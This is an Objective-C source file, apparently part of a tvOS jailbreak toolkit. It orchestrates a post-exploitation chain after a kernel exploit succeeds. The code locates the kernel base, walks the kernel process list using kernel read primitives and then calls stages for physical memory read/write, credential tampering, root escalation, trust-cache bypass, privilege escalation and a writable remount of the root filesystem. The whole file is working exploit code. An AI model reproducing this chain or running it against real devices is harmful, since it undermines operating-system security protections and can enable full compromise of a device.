#import "dt_do_fun.h"
#import "dt_misaka_offsets.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "dt_kernel_exploit.h"
#import "dt_darksword_stages.h"
#import "dt_kfund_import.h"
#import "darksword_tvos.h"
#import "kfd_tvos.h"

#import "info.h"
#import "primitives.h"
#import <mach-o/loader.h>
#import <unistd.h>
#import <stdarg.h>

static void DTLog(void (^log)(NSString *), NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [[DTRunLogger shared] log:line];
    if (log) log(line);
}

static uint64_t dt_get_proc_by_pid(int pid, uint64_t kernproc)
{
    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    uint64_t proc = kernproc;
    while (proc) {
        if ((int)kread32(proc + o->off_p_pid) == pid)
            return proc;
        proc = kread64(proc + o->off_p_list_le_prev);
    }
    return 0;
}

BOOL dt_do_fun(void (^log)(NSString *line))
{
    if (!dt_kernel_exploit_is_active()) {
        DTLog(log, @"ERROR: kernel exploit not active");
        return NO;
    }

    dt_apply_post_exploit_system_info();

    if (!dt_kernel_exploit_verify_slide_consistency()) {
        DTLog(log, @"ERROR: kernel slide/base consistency check failed");
        return NO;
    }

    dt_misaka_offsets_init();

    uint64_t kslide = dt_kernel_exploit_slide();
    uint64_t kbase = dt_get_vm_kernel_link_addr() + kslide;
    DTLog(log, @"[*] slide=0x%llx kbase=0x%llx", kslide, kbase);

    uint64_t magic = kread64(kbase);
    if ((uint32_t)magic != MH_MAGIC_64) {
        DTLog(log, @"[!] kernel magic mismatch 0x%llx", magic);
    }

    int pid = getpid();
    uint64_t proc = dt_kernel_exploit_current_proc();
    if (!proc)
        proc = dt_get_proc_by_pid(pid, dt_kernel_exploit_kernel_proc());
    if (!proc) {
        DTLog(log, @"ERROR: could not find self proc");
        return NO;
    }

#if DT_PHYSRW_HANDOFF
    dt_ds_stage("DS14 PHYRW_BEGIN");
    int handoff_r = dt_build_physrw_handoff_only(log);
    if (handoff_r != 0) {
        DTLog(log, @"[!] handoff failed (%d)", handoff_r);
        return NO;
    }
    dt_ds_stage("DS15 PHYRW_OK");

    int cred_r = dt_build_phys_cred_smoke(proc, log);
    if (cred_r != 0) {
        DTLog(log, @"[!] build24 failed (%d)", cred_r);
        return NO;
    }

    int root_r = dt_build_phys_root_esc(proc, log);
    if (root_r != 0) {
        DTLog(log, @"[!] build25 failed (%d)", root_r);
        return NO;
    }

    int tc_r = dt_build_trustcache_smoke(log);
    if (tc_r != 0) {
        DTLog(log, @"[!] build26 failed (%d)", tc_r);
        return NO;
    }

    int priv_r = dt_build97_privesc_preserve_slot0(proc, log);
    if (priv_r != 0) {
        DTLog(log, @"[!] build27 failed (%d)", priv_r);
        return NO;
    }

    int remount_r = dt_build_remount_smoke(log);
    if (remount_r == DT_BUILD47_ERR_GRAPH_INCOMPLETE) {
        DTLog(log,
            @"[!] build76 root + phys R/W + privesc OK — remount N/A on this boot "
            @"(hollow fsprivate / graph incomplete errno=%d — grep [build76 TEST])", remount_r);
        [[DTRunLogger shared] logStage:@"build76 exploit OK remount N/A"];
    } else if (remount_r != 0) {
        DTLog(log, @"[!] build47 failed (%d)", remount_r);
        return NO;
    } else {
        DTLog(log, @"[+] build81 rootful remount OK — remountWritable=1 (grep [build76 TEST] remount=OK)");
        [[DTRunLogger shared] logStage:@"build81 exploit OK remount OK"];
    }
#else
    DTLog(log, @"[i] phys-rw handoff disabled");
#endif

    DTLog(log, @"[+] pipeline complete uid=%u gid=%u", (unsigned)getuid(), (unsigned)getgid());
    if (darksword_is_active())
        dt_ds_stage("DARKSWORD_DO_FUN_PASS");
    return YES;
}
